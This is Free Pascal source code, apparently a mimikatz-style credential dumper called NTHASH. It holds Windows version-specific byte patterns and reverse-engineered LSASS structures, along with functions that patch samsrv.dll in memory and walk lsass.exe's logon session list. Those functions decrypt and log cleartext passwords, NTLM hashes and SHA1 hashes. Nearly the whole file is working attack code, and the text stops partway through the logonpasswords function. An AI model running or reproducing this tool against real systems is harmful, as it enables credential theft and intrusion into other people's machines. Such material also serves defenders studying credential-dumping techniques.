{$mode delphi}{$H+}
//{$r uac.res}

//define {$DEFINE DYNAMIC_LINK} in jediapilib.inc : NOT
//define {$DEFINE DYNAMIC_LINK} in JwaBCrypt : OK  - for CPU32 only - to allow xp...


program NTHASH;

uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,
  uadvapi32, untdll, utils, umemory, ucryptoapi, usamutils, uofflinereg,
  uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport, wtsapi32, uwmi, base64,
  udpapi,udebug,injection;


//***************************************************************************

type _LUID =record
     LowPart:DWORD;
     HighPart:LONG;
end;


  //session_entry to creds_entry to cred_hash_entry to ntlm_creds_block

  type _credentialkeys=record
       unk1:array[0..51] of byte; //lots of things i am missing ...
       ntlm_len:dword;
       ntlmhash:array[0..15] of byte;
       sha1_len:dword;
       sha1:array[0..19] of byte;
       end;
    Pcredentialkeys=^_credentialkeys;

     type _CRED_NTLM_BLOCK_1903=record
       domainlen1:word;
       domainlen2:word;
       unk1:dword;
       domainoff:word;
       unk2:array[0..5] of byte;
       //+16
       usernamelen1:word;
       usernamelen2:word;
       unk3:dword;
       usernameoff:word;
       unk4:array[0..5] of byte;
       //
       //unk5:array[0..15] of byte;
       unk6:array[0..9+16+16] of byte;
       //+32
       ntlmhash:tbyte16; //array[0..15] of byte;
       lmhash:tbyte16; //array[0..15] of byte;
       //+64
       sha1:array[0..19] of byte; //sha1
       //domain
       //username
       end;
    PCRED_NTLM_BLOCK_1903=^_CRED_NTLM_BLOCK_1903;


  type _CRED_NTLM_BLOCK=record
       {$ifdef CPU64}
       domainlen1:word;
       domainlen2:word;
       unk1:dword;
       domainoff:word;
       unk2:array[0..5] of byte;
       //+16
       usernamelen1:word;
       usernamelen2:word;
       unk3:dword;
       usernameoff:word;
       unk4:array[0..5] of byte;
       //+32
       ntlmhash:tbyte16; //array[0..15] of byte;
       lmhash:tbyte16; //array[0..15] of byte;
       //+64
       sha1:array[0..19] of byte; //sha1
       //domain
       //username
        {$endif CPU64}
        {$ifdef CPU32}
        domainlen1:word;
        domainlen2:word;
        domainoff:word;
        unk1:word;
        usernamelen1:word;
        usernamelen2:word;
        usernameoff:word;
        unk3:word;
        unk4:tbyte16;
        {$endif CPU32}

       end;
    PCRED_NTLM_BLOCK=^_CRED_NTLM_BLOCK;

  type _KIWI_MSV1_0_PRIMARY_CREDENTIALS =record
  	//probably a lsa_unicode_string len & bufer
         len:ushort;
         maxlen:ushort;
         //unk1:dword;
         Primary:pointer; //a string like Primary#0 or CredentialKeys#
         //
         Credentials:LSA_UNICODE_STRING; //buffer contains a cred_ntlm_block

          end;
   PKIWI_MSV1_0_PRIMARY_CREDENTIALS=^_KIWI_MSV1_0_PRIMARY_CREDENTIALS;

    type _KIWI_MSV1_0_CREDENTIALS =record
  	next:pointer;    //loop ...
  	AuthenticationPackageId:DWORD;
  	PrimaryCredentials:PKIWI_MSV1_0_PRIMARY_CREDENTIALS;
    end;
  PKIWI_MSV1_0_CREDENTIALS=^_KIWI_MSV1_0_CREDENTIALS;

  type _KIWI_MSV1_0_LIST_63 =record
  	Flink:nativeuint;	//off_2C5718
  	Blink:nativeuint; //off_277380
  	unk0:pvoid; // unk_2C0AC8
  	unk1:ULONG; // 0FFFFFFFFh
  	unk2:PVOID; // 0
  	unk3:ULONG; // 0
  	unk4:ULONG; // 0
  	unk5:ULONG; // 0A0007D0h
  	hSemaphore6:handle; // 0F9Ch
  	unk7:PVOID; // 0
  	hSemaphore8:HANDLE; // 0FB8h
  	unk9:PVOID; // 0
  	unk10:PVOID; // 0
  	unk11:ULONG; // 0
  	unk12:ULONG; // 0
  	unk13:PVOID; // unk_2C0A28
  	LocallyUniqueIdentifier:_LUID; //LUID would work
  	SecondaryLocallyUniqueIdentifier:_LUID;
  	waza:array[0..11] of byte; /// to do (maybe align)
  	UserName:LSA_UNICODE_STRING;
  	Domain:LSA_UNICODE_STRING;
  	unk14:PVOID;
  	unk15:PVOID;
  	Type_:LSA_UNICODE_STRING;
  	pSid:PSID;
  	LogonType:ULONG;
  	unk18:PVOID;
  	Session:ULONG;
  	LogonTime:LARGE_INTEGER; // autoalign x86
  	LogonServer:LSA_UNICODE_STRING;
  	Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
  	unk19:PVOID;
  	unk20:PVOID;
  	unk21:PVOID;
  	unk22:ULONG;
  	unk23:ULONG;
  	unk24:ULONG;
  	unk25:ULONG;
  	unk26:ULONG;
  	unk27:PVOID;
  	unk28:PVOID;
  	unk29:PVOID;
  	CredentialManager:PVOID; //need to investigate here - password are encrypted in clear here
          end;
   PKIWI_MSV1_0_LIST_63=^_KIWI_MSV1_0_LIST_63;

   type _KIWI_MSV1_0_LIST_61 =record
   	Flink:nativeuint;	//off_2C5718
   	Blink:nativeuint; //off_277380
   	unk0:pvoid; // unk_2C0AC8
   	unk1:ULONG; // 0FFFFFFFFh
   	unk2:PVOID; // 0
   	unk3:ULONG; // 0
   	unk4:ULONG; // 0
   	unk5:ULONG; // 0A0007D0h
  	hSemaphore6:handle; // 0F9Ch
  	unk7:PVOID; // 0
  	hSemaphore8:HANDLE; // 0FB8h
  	unk9:PVOID; // 0
  	unk10:PVOID; // 0
  	unk11:ULONG; // 0
  	unk12:ULONG; // 0
  	unk13:PVOID; // unk_2C0A28
  	LocallyUniqueIdentifier:_LUID; //LUID would work
  	SecondaryLocallyUniqueIdentifier:_LUID;
  	UserName:LSA_UNICODE_STRING;
  	Domain:LSA_UNICODE_STRING;
  	unk14:PVOID;
  	unk15:PVOID;
  	pSid:PSID;
  	LogonType:ULONG;
  	Session:ULONG;
  	LogonTime:LARGE_INTEGER; // autoalign x86
  	LogonServer:LSA_UNICODE_STRING;
          Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
          unk19:PVOID;
          unk20:PVOID;
          unk21:PVOID;
          unk22:ULONG;
  	CredentialManager:PVOID
  end;
     PKIWI_MSV1_0_LIST_61=^_KIWI_MSV1_0_LIST_61;

  type _KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  =record
  	Flink:nativeuint;	//off_2C5718
  	Blink:nativeuint; //off_277380
  	unk0:pvoid; // unk_2C0AC8
  	unk1:ULONG; // 0FFFFFFFFh
  	unk2:PVOID; // 0
  	unk3:ULONG; // 0
  	unk4:ULONG; // 0
  	unk5:ULONG; // 0A0007D0h
         hSemaphore6:handle; // 0F9Ch
         unk7:PVOID; // 0
         hSemaphore8:HANDLE; // 0FB8h
         unk9:PVOID; // 0
         unk10:PVOID; // 0
         unk11:ULONG; // 0
         unk12:ULONG; // 0
         unk13:PVOID; // unk_2C0A28
         LocallyUniqueIdentifier:_LUID; //LUID would work
         SecondaryLocallyUniqueIdentifier:_LUID;
         waza:array[0..11] of byte; /// to do (maybe align)
         UserName:LSA_UNICODE_STRING;
         Domain:LSA_UNICODE_STRING;
         unk14:PVOID;
         unk15:PVOID;
         pSid:PSID;
         LogonType:ULONG;
         Session:ULONG;
         LogonTime:LARGE_INTEGER; // autoalign x86
         LogonServer:LSA_UNICODE_STRING;
         Credentials:pointer; //PKIWI_MSV1_0_CREDENTIALS;
         unk19:PVOID;
         unk20:PVOID;
         unk21:PVOID;
         unk22:ULONG;
         CredentialManager:PVOID
  end;
    PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ=^_KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ ;

  type _generic_list=record
          unk1:nativeuint;
          unk2:nativeuint;
          unk3:nativeuint;
          unk4:nativeuint;
          unk5:nativeuint;
          unk6:nativeuint;
          unk7:nativeuint;
          unk8:nativeuint;
  end;
   Pgeneric_list=^_generic_list;


    //****************************************************************





var
  lsass_pid:dword=0;
  _long:longint;
  p,ret,dw,dw1,dw2:dword;
  consolecp:uint;
  rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input,mode,key:string;
  inputw:widestring;
  oldhashbyte,newhashbyte:tbyte16;
  myPsid:PSID;
  mystringsid:pchar;
  w:array of widechar;
  syskey,samkey,ntlmhash:tbyte16;
  input_,key_,output_:tbytes;
  ptr_:pointer;
  sessions:asession;
  mk:tmasterkey;
  myblob:tdpapi_blob;
  credhist:tDPAPI_CREDHIST;
  pb:pbyte;
  inhandle,hmod,ProcessHandle:thandle;
  label fin;





//********************************************************************************





//https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
function dumpsam(pid:dword;user:string):boolean;
//*****************************************************
function Init_Int_User_Info:tbytes;
const
PTRN_WALL_SampQueryInformationUserInternal:array[0..3] of byte=($49, $8d, $41, $20);
PTRN_WALL_SampQueryInformationUserInternal_X86:array[0..4] of byte=($c6, $40, $22, $00, $8b);
var
  pattern:array of byte;
begin

  if LowerCase (osarch )='amd64' then
     begin
     setlength(pattern,length(PTRN_WALL_SampQueryInformationUserInternal));
     CopyMemory (@pattern[0],@PTRN_WALL_SampQueryInformationUserInternal[0],length(PTRN_WALL_SampQueryInformationUserInternal));
     end
     else
     begin
     setlength(pattern,length(PTRN_WALL_SampQueryInformationUserInternal_X86));
     CopyMemory (@pattern[0],@PTRN_WALL_SampQueryInformationUserInternal_X86[0],length(PTRN_WALL_SampQueryInformationUserInternal_X86));
     end;
result:=pattern;
end;
//*****************************************************
const
//offset x64
WIN_BUILD_2K3:ShortInt=	-17; //need a nop nop
WIN_BUILD_VISTA:ShortInt=	-21;
WIN_BUILD_BLUE:ShortInt=	-24;
WIN_BUILD_10_1507:ShortInt=	-21;
WIN_BUILD_10_1703:ShortInt=	-19;
WIN_BUILD_10_1709:ShortInt=	-21;
WIN_BUILD_10_1803:ShortInt=	-21; //verified
WIN_BUILD_10_1809:ShortInt=	-24;
WIN_BUILD_10_1903:ShortInt=	-24;
//offset x86
WIN_BUILD_XP_86:ShortInt=-8;
WIN_BUILD_7_86:ShortInt=-8; //verified
WIN_BUILD_8_86:ShortInt=-12;
WIN_BUILD_BLUE_86:ShortInt=-8;
WIN_BUILD_10_1507_86:ShortInt=-8;
WIN_BUILD_10_1607_86:ShortInt=-12;
const
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
var
  module:string='samsrv.dll';
  hprocess:thandle;
  backup:array[0..1] of byte;
  read:cardinal;
  offset:nativeuint=0;
  patch_pos:ShortInt=0;
  pattern:tbytes;
begin
  result:=false;
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,3)='6.0' then patch_pos :=WIN_BUILD_VISTA;
     if copy(winver,1,3)='6.1' then patch_pos :=WIN_BUILD_VISTA; //win7
     if copy(winver,1,3)='6.3' then patch_pos :=WIN_BUILD_BLUE; //win 8.1
     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507;
     if (pos('-1703',winver)>0) then patch_pos :=WIN_BUILD_10_1703;
     if (pos('-1709',winver)>0) then patch_pos :=WIN_BUILD_10_1709;
     if (pos('-1803',winver)>0) then patch_pos :=WIN_BUILD_10_1803;
     if (pos('-1809',winver)>0) then patch_pos :=WIN_BUILD_10_1809;
     if (pos('-1903',winver)>0) then patch_pos :=WIN_BUILD_10_1903; //verified
     end;
  if (lowercase(osarch)='x86') then
     begin
     if copy(winver,1,3)='5.1' then patch_pos :=WIN_BUILD_XP_86;
     //vista - 6.0?
     if copy(winver,1,3)='6.1' then patch_pos :=WIN_BUILD_7_86;
     //win 8.0 ?
     if (pos('-1507',winver)>0) then patch_pos :=WIN_BUILD_10_1507_86;
     if (pos('-1607',winver)>0) then patch_pos :=WIN_BUILD_10_1607_86;
     end;
  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  pattern:=Init_Int_User_Info ;
  log('Pattern:'+ByteToHexaString (@pattern[0],length(pattern)));
  if search_module_mem (pid,module,pattern,offset)=false then
     begin
     log('search_module_mem NOT OK');
     exit;
     end;
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //if ReadProcessMemory( hprocess,pointer(offset+patch_pos),@backup[0],2,@read) then
                                 if ReadMem  (hprocess,offset+patch_pos,backup) then
                                   begin
                                   log('ReadProcessMemory OK '+leftpad(inttohex(backup[0],1),2)+leftpad(inttohex(backup[1],1),2),0);
                                   if WriteMem(hprocess,offset+patch_pos,after)=true then
                                        begin
                                        log('patch ok',0);
                                        try
                                        log('***************************************',0);
                                        if QueryUsers ('','',@callback_QueryUser )=true
                                        //if QueryInfoUser (user)=true
                                           then begin log('SamQueryInformationUser OK',0);result:=true;end
                                           else log('SamQueryInformationUser NOT OK',1);
                                        log('***************************************',0);
                                        finally //we really do want to patch back
                                        if WriteMem(hprocess,offset+patch_pos,backup)=true then log('patch ok') else log('patch failed');
                                        //should we read and compare before/after?
                                        end;
                                        end
                                        else log('patch failed',1);
                                   end; //if ReadMem
                                 end; //if offset<>0 then
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
       closehandle(hprocess);
       end;//if openprocess...

end;

//check kuhl_m_sekurlsa_utils.c
function logonpasswords(pid:dword;luid:int64=0;hash:string='';func:pointer =nil):boolean;
const
  //dd Lsasrv!LogonSessionList in windbg
  //1703 works for 1709
  PTRN_WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
  PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
  PTRN_WN60_LogonSessionList:array [0..13] of byte=($33, $ff, $45, $85, $c0, $41, $89, $75, $00, $4c, $8b, $e3, $0f, $84);
  PTRN_WN61_LogonSessionList:array [0..11] of byte=($33, $f6, $45, $89, $2f, $4c, $8b, $f3, $85, $ff, $0f, $84);
  PTRN_WN63_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
  PTRN_WN6x_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c0, $74);
//x86
PTRN_WN51_LogonSessionList_x86:array [0..6] of byte= ($ff, $50, $10, $85, $c0, $0f, $84);
PTRN_WNO8_LogonSessionList_x86:array [0..7] of byte= ($89, $71, $04, $89, $30, $8d, $04, $bd);
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
var
  module:string='lsasrv.dll';
  hprocess:thandle;
  //offset_list:array[0..3] of byte;
  offset_list_dword:dword;
  read:cardinal;
  offset:nativeuint=0;
  patch_pos:ShortInt=0;
  pattern:array of byte;
  logsesslist:array [0..sizeof(_KIWI_MSV1_0_LIST_63)-1] of byte;
  bytes,bytes2:array[0..1023] of byte;
  password,decrypted,output:tbytes;
  username,domain:array [0..254] of widechar;
  credentials,ptr,first,current:nativeuint;
  CREDENTIALW:_CREDENTIALW;
begin
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,3)='6.0' then //vista
        begin
        setlength(pattern,sizeof(PTRN_WN60_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN60_LogonSessionList[0],sizeof(PTRN_WN60_LogonSessionList));
        //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
        patch_pos:=21;
        end ;
     if copy(winver,1,3)='6.1' then  //win7 & 2k8
        begin
        setlength(pattern,sizeof(PTRN_WN61_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN61_LogonSessionList[0],sizeof(PTRN_WN61_LogonSessionList));
        //{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LogonSessionList),	PTRN_WN61_LogonSessionList},	{0, NULL}, {19,  -4}},
        patch_pos:=19;
        end ;
     if copy(winver,1,3)='6.3' then  //win8.1 aka blue
        begin
        setlength(pattern,sizeof(PTRN_WN63_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN63_LogonSessionList[0],sizeof(PTRN_WN63_LogonSessionList));
        patch_pos:=36;
        end ;
     if (pos('-1703',winver)>0) or (pos('-1709',winver)>0) then //win10
        begin
        setlength(pattern,sizeof(PTRN_WN1703_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN1703_LogonSessionList[0],sizeof(PTRN_WN1703_LogonSessionList));
        patch_pos:=23;
        end;
     if (pos('-1803',winver)>0)  then //win10
        begin
        setlength(pattern,sizeof(PTRN_WN1803_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN1803_LogonSessionList[0],sizeof(PTRN_WN1803_LogonSessionList));
        patch_pos:=23;
        end;
     if (pos('-1903',winver)>0)  then //win10
        begin
        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
        patch_pos:=23;
        end;
     if (pos('-2004',winver)>0)  then //win10
        begin
        setlength(pattern,sizeof(PTRN_WN6x_LogonSessionList));
        copymemory(@pattern[0],@PTRN_WN6x_LogonSessionList[0],sizeof(PTRN_WN6x_LogonSessionList));
        patch_pos:=23;
        end;
     end;
  if (lowercase(osarch)='x86') then
        begin
        if copy(winver,1,3)='5.1' then //xp
        begin
        setlength(pattern,sizeof(PTRN_WN51_LogonSessionList_x86));
        copymemory(@pattern[0],@PTRN_WN51_LogonSessionList_x86[0],sizeof(PTRN_WN51_LogonSessionList_x86));
        patch_pos:=24;
        end;
        if (copy(winver,1,3)='6.0') or (copy(winver,1,3)='6.1') then //vista and win7
        begin
        setlength(pattern,sizeof(PTRN_WNO8_LogonSessionList_x86));
        copymemory(@pattern[0],@PTRN_WNO8_LogonSessionList_x86[0],sizeof(PTRN_WNO8_LogonSessionList_x86));
        patch_pos:=-11;
        end;
     end;

  //
    if symmode=true then
       begin
         try
         if _SymFromName (strpas(sysdir)+'\'+module,'LogonSessionList',offset)
            then
               begin
               log('_SymFromName:'+inttohex(offset,sizeof(offset)));
               patch_pos:=-1;
               end
            else log('_SymFromName:failed');
         except
         on e:exception do log(e.Message );
         end;
       end;
  //

  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  if search_module_mem (pid,module,pattern,offset)=false then
     begin
     log('search_module_mem NOT OK');
     exit;
     end;
  //
  if offset=0 then exit;
  log('found:'+inttohex(offset,sizeof(pointer)),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);

                 //
                 if patch_pos <>-1 then //some more work to find the relative offset
                 if ReadMem  (hprocess,offset+patch_pos,@offset_list_dword,sizeof(offset_list_dword)) then
                   begin
                   log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
                   {$ifdef CPU64}
                   offset:= offset+offset_list_dword+4+patch_pos;
                   {$endif CPU64}
                   {$ifdef CPU32}
                   offset:= offset_list_dword{+patch_pos};
                   {$endif CPU32}
                   end; //if ReadMem

                   ///lets finally do the work
                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
                   //new offset to the list entry
                   log('offset LogonSessionList:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                   //read sesslist at offset
                   ReadMem  (hprocess,offset,logsesslist );
                   //lets skip the first one
                   current:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink);
                   ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
                   //dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                   //lets loop
                   //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
                   //while dummy<>inttohex(offset,sizeof(pointer)) do
                   while _KIWI_MSV1_0_LIST_63 (logsesslist ).flink<>offset do
                   begin
                   //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
                   if (luid=0) or (luid=_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart) then
                   begin
                   log('**************************************************',1);
                   if func<>nil then fn(func)(pointer(@logsesslist[0]) );
                   log('entry#current:'+inttohex(current,sizeof(pointer)),0) ;
                   log('entry#prev:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).blink,sizeof(pointer)),0) ;
                   log('entry#next:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer)),0) ;
                   //
                   log('LUID:'+inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart ,sizeof(_LUID)),1) ;
                   //log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
                   //get username
                   if ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).username.buffer),bytes )
                      then log('username:'+strpas (pwidechar(@bytes[0])),1);
                   //copymemory(@username[0],@bytes[0],64);
                   //log('username:'+widestring(username),1);
                   //get domain
                   if ReadMem  (hprocess,nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).domain.buffer),bytes )
                      then log('domain:'+strpas (pwidechar(@bytes[0])),1);
                   //copymemory(@domain[0],@bytes[0],64);
                   //log('domain:'+widestring(domain),1);
                   //
                   if copy(winver,1,3)='6.1'
                      then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).CredentialManager)
                      else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager);
                   first:=0;
                   if Credentials<>0 then
                     begin
                     log('->CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
                     //CredentialManager
                     ReadMem  (hprocess,credentials,bytes);
                     log('unk4:'+inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),0);
                     ReadMem  (hprocess,Pgeneric_list (@bytes[0]).unk4,bytes);
                     ptr:=Pgeneric_list (@bytes[0]).unk3;
                     log('unk3:'+inttohex(ptr  ,sizeof(nativeuint)),0);
                     ReadMem  (hprocess,ptr,bytes);
                     //we should loop here
                     while 1=1 do
                     begin
                     log('Prev/Next:'+inttohex(Pgeneric_list (@bytes[0]).unk1,sizeof(nativeuint))+'/'+inttohex(Pgeneric_list (@bytes[0]).unk2,sizeof(nativeuint)),0);
                     if first=0 then first:=Pgeneric_list (@bytes[0]).unk1;
                     log('-CREDENTIALW:'+inttohex(ptr-$58  ,sizeof(nativeuint)),1);
                     ZeroMemory(@CREDENTIALW,sizeof(CREDENTIALW));
                     readmem(hprocess,ptr-$58,@CREDENTIALW ,sizeof(CREDENTIALW));
                     if nativeuint(CREDENTIALW.UserName)>0 then
                       begin
                       if readmem(hprocess,nativeuint(CREDENTIALW.UserName),@username[0],sizeof(username))
                          then log('UserName:'+ username,1) ;
                       end;
                     if nativeuint(CREDENTIALW.TargetName)>0 then
                       begin
                       if readmem(hprocess,nativeuint(CREDENTIALW.TargetName ),@username[0],sizeof(username))
                          then log('TargetName:'+ username,1) ;
                       end;
                     log('CredentialBlobSize:'+inttostr(CREDENTIALW.CredentialBlobSize),0) ;
                     //encrypted password is $e0 aka 224 bytes later
                     //start of credential structure is -$58
                     //password - $110 is the pointer to the password
                     if (CREDENTIALW.CredentialBlobSize>0) and (CREDENTIALW.CredentialBlobSize<16384) and (nativeuint(CREDENTIALW.CredentialBlob)<>0) then
                     begin
                     log('CredentialBlob:'+inttohex(nativeuint(CREDENTIALW.CredentialBlob),sizeof(nativeuint)),0) ;
                     setlength(password,CREDENTIALW.CredentialBlobSize);
                     ReadMem  (hprocess,nativeuint(CREDENTIALW.CredentialBlob),password );
                     //log(ByteToHexaString(password),1);
                     setlength(decrypted,255);
                             if decryptLSA (CREDENTIALW.CredentialBlobSize,password,decrypted)=false
                             then log('decryptLSA NOT OK',1)
                             else
                             begin
                             log('Password:'+strpas (pwidechar(@decrypted[0]) ),1);
                             //log(BytetoAnsiString(decrypted),1);
                             end;
                     end;//if CREDENTIALW.CredentialBlobSize>0 then
                     if Pgeneric_list (@bytes[0]).unk2=first then break;
                     ptr:=Pgeneric_list (@bytes[0]).unk2;
                     log(inttohex(ptr  ,sizeof(nativeuint)),0);
                     ReadMem  (hprocess,ptr,bytes);
                     end; //while 1=1 do
                     end; //if Credentials<>0 then
                   //
                   if copy(winver,1,3)='6.1'
                      then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).Credentials)
                      else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
                   if Credentials<>0 then
                     begin
                     log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
                     ReadMem  (hprocess,credentials,bytes );
                     //we should loop thru credentials...
                     //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
                     while 1=1 do
                     begin
                     credentials:=nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next);
                     log('CREDENTIALS.next:'+inttohex (nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next),sizeof(pointer) ));
                     log('CREDENTIALS.AuthID:'+inttohex (PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).AuthenticationPackageId,8 ),1);
                     log('CREDENTIALS.PrimaryCredentialsPtr:'+inttohex(nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+8,sizeof(pointer))) ;
                     //primary credentials...
                     ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).PrimaryCredentials)+sizeof(pointer),bytes );
                     //len will help us distinguish between "Primary" and "CredentialKeys"
                     log('PrimaryCredentials.len:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len) ) ;
                     log('PrimaryCredentials.Primary:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).primary) ,sizeof(pointer))) ;
                     if readmem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).primary),bytes2)
                         then log('Primary Description:'+pchar(@bytes2[0]));
                     log('PrimaryCredentials.Credentials.buffer:'+inttohex(nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer) ,sizeof(pointer))) ;
                     log('PrimaryCredentials.Credentials.length:'+inttostr(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length )) ;
                     //decrypt !
                     if (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0) and (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length<=1024) then
                       begin
                       setlength(password,PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length);
                       ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),password );
                       setlength(decrypted,1024);
                       if decryptLSA (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,password,decrypted)=false
                                     then log('decryptLSA NOT OK')
                                     else
                                       begin
                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=7 then
                                          begin
                                          log('->Primary',1);
                                          //log('domainoff:'+inttostr(PCRED_NTLM_BLOCK(@decrypted[0]).domainoff)) ;
                                          //log('usernameoff:'+inttostr(PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff)) ;
                                          log('domain:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).domainoff]),1);
                                          log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                          {$ifdef CPU64}
                                          //log(winver);
                                          if (pos('-1903',winver)>0) or (pos('-1803',winver)>0) or (pos('-1703',winver)>0) or
                                             (pos('-1909',winver)>0) or (pos('-1809',winver)>0) or (pos('-1709',winver)>0) or
                                             (pos('-2004',winver)>0)
                                             then
                                             begin
                                             //log('1903');
                                             log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK_1903(@decrypted[0]).ntlmhash) ,1);
                                             log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK_1903(@decrypted[0]).sha1) ,1);
                                             end
                                             else
                                             begin
                                             log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
                                             log('sha1:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).sha1) ,1);
                                             end;
                                          {$endif CPU64}
                                          {$ifdef CPU32}
                                          log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).unk4) ,1);
